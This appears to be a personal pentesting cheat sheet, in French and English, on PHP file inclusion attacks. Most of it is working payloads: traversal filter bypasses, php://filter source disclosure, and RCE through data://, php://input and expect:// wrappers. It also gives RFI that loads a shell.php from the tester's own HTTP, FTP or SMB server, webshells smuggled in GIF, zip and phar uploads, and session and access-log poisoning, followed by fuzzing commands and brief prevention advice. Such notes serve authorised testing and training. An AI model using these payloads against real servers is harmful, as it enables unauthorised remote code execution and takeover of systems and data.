# File Inclusion

----
## 

###### Path transversal
```bash
# utiliser pour se deplacer et executer le fichier 
../<NomFile>
```

###### Basic Bypasses

```bash
# filter : replace ../ by ''
Bypass : ....// | ..\/ | convertIntoURLEncoding

# Approved Paths 
Bypass : ./<CurrentDirectory>/<PathTransversal>
```
* Path Trucation 
* Null Bytes 
    * Ajouter %00 à la fin de l'extension du fichier

###### PHP Filters
- Directory fuzzing ( dirbuster, ffuf )
- Lire un fichier php
```URL
# mettre dans l'url
php://filter/read=convert.base64-encode/resource=<FileName>
```
----

## Remote Code Execution

###### PHP Wrappers

* DATA : check allow_url_include `**/etc/php/<X.Y>/apache2/php.ini**`
    
    
    ```bash
    # verify if  `allow_url_include` or `expect` are allowed

    curl "http://<SERVER_IP>:<PORT>/<Vulnerable-LFI-Path>=php://filter/read=convert.base64-encode/resource=../../../../etc/php/<X.Y>/apache2/php.ini"

    # copy the base64 , décode and grep `allow_url_include` or `expect`
    ```
    * if enabled :
        ```bash
        echo '<?php system($_GET["cmd"]); ?>' | base64
        # attack
        curl -s 'http://<SERVER_IP>:<PORT>/<Vulnerable-LFI-Path>=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep <uid| cmd>
        ```

* INPUT : the input wrapper can be used to include external input and execute PHP code.
    - To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (` <\?php system('id')?>`)

    ```bash
    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT><Vulnerable-LFI-Path>=php://input&cmd=id" | grep uid
    ```

* EXPECT : it is designed to execute commands.
    ```bash
    curl -s "http://<SERVER_IP>:<PORT>/<Vulnerable-LFI-Path>=expect://id"
    ```

###### Remote File Inclusion (RFI)

1.1 -  check allow_url_include

1.2 - start by trying to include a local URL

```bash
http://<SERVER_IP>:<PORT>/<Vulnerable-LFI-Path>=http://127.0.0.1:<Port>/<PageOfWebsite>
```

- Si ca marche 

**2 - Remote Code Execution with RFI**
- Create webshell or phpbash
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```
            
- run RFI 

    ```bash
    # my machine ( RFI with http)
    sudo python3 -m http.server <LISTENING_PORT>
    # curl or navigator
    http://<SERVER_IP>:<PORT>/<Vulnerable-LFI-Path>=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

    # RFI with ftp
    sudo python -m pyftpdlib -p 21
    # curl or navigator
    http://<SERVER_IP>:<PORT>/<Vulnerable-LFI-Path>=ftp://<OUR_IP>/shell.php&cmd=id

    # RFI with SMB
    impacket-smbserver -smb2support share $(pwd)
    # curl or navigator
    http://<SERVER_IP>:<PORT>/<Vulnerable-LFI-Path>=\\<OUR_IP>\share\shell.php&cmd=whoami

    ```

###### LFI and File Uploads

- [File Upload](../Topics/File%20Upload.md)

- **Crafting Malicious Image**
    ```bash
    # use malicious gif file
    # 1 - create file 
    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
    # 2 - upload file 
    # 3 - change img url in html code 
    # get access via navigator or curl
    http://<SERVER_IP>:<PORT>/<Vulnerable-Path-LFI>=./<FILE-DIRECTORY-STOCKAGE>/shell.gif&cmd=id
    ```
- **ZIP Upload : ZIP Wrapper**
    ```bash
    # 1 - create malicious webshell
    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

    # 2 -  upload 

    # 3 - get acces
    http://<SERVER_IP>:<PORT>/<Vulnerable-Path-LFI>=zip://./<FILE-STOCKAGE-PAHT>/shell.jpg%23shell.php&cmd=id

    ```

- **PHAR Upload**

```bash
# 1 - shell.php file
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

# 2 - rename 
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
# 3 - upload file 

# get access
http://<SERVER_IP>:<PORT>/<Vulnerable-Path-LFI>=phar://./<FILE-STOCKAGE-PAHT>/shell.jpg%2Fshell.txt&cmd=id
```

###### Log Poisoning

| Tools |Path for Cookie Session file and access and errof file|
|-----|-----|
|PHP|`/var/lib/php/sessions/sess_<PHPSESSID>`, `C:\Windows\Temp\`|
|Apache|`/var/log/apache2/`,`C:\xampp\apache\logs\`  |
|Nginx|`/var/log/nginx/`, `C:\nginx\log\`|
**PHP Session Poisoning**
- check cookies in navigator
- use it to poison the session cookie file
```bash
# 1 - test
http://<SERVER_IP>:<PORT>/<Vulnerable-Path-LFI>=session_poisoning

# 2 - test to see if you will see session_poisoning in display
http://<SERVER_IP>:<PORT>/<Vulnerable-Path-LFI>=/var/lib/php/sessions/sess_<CookieString>

# 3 - upload the webshell after poisoning
http://<SERVER_IP>:<PORT>/<Vulnerable-Path-LFI>=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

# 4 - RCE via webshell
http://<SERVER_IP>:<PORT>/<Vulnerable-Path-LFI>=/var/lib/php/sessions/sess_<CookieString>&cmd=<CMD>

# repeat step 4 and 5 each time do the RCE 
```
**Server Log Poisoning**
-  The log contains the remote IP address, request page, response code, and the User-Agent header.

-  use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning
    ```bash
    # get to access.log with navigator and 
    # Replace user-agent by webshell with burp
    # reuse the link by adding &cmd=id to the first line ( path to file) when access after poisoning 

    # alternative
    curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
    ```

- other similar log poisoning session
    ```bash
    /var/log/sshd.log
    /var/log/mail
    /var/log/vsftpd.log
    # try to find if ftp or ssh log are exposed
    ```
---

## Automation and Prevention

###### Automated Scanning 

-  Parametter FUZZING
    ```bash
    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
    ```
- LFI Wordlist in : `Seclists/Fuzzing/LFI`
- Value FUZZING 
    ```bash
    ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?<Vulnerable-LFI-Path>=FUZZ' -fs 2287
    ```
- Server Webroot fuzzing
    ```bash
    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?<Vulnerable-LFI-Path>=../../../../FUZZ/index.php'
    ```

-  Server Logs/Configurations

    ```bash
    ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?<Vulnerable-LFI-Path>=../../../../FUZZ'
    ```

###### Prevention

-  Avoid passing any user-controlled inputs into any file inclusion functions or APIs

- The page should be able to dynamically load assets on the back-end, with no user interaction whatsoever

- We should ensure that no user input is directly going into any function that can read files

    -  utilize a limited whitelist of allowed user inputs, and match each input to the file to be loaded

###### Preventing Directory Traversal

- Use language built-in tool to pull only the filename.

- We should globally disable the inclusion of remote files: `allow_url_fopen` and `allow_url_include` to Off.

- Disable potentially dangerous modules, like PHP Expect mod_userdir.

- Use WAF ( Web App Firewall) like `ModSecurity` 

**Ressource**
- [LFI wordlist Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
- [LFI wordlist windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
- [HackTrick](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters)
- **Tool :** LFISuite, liffy, LFiFreak
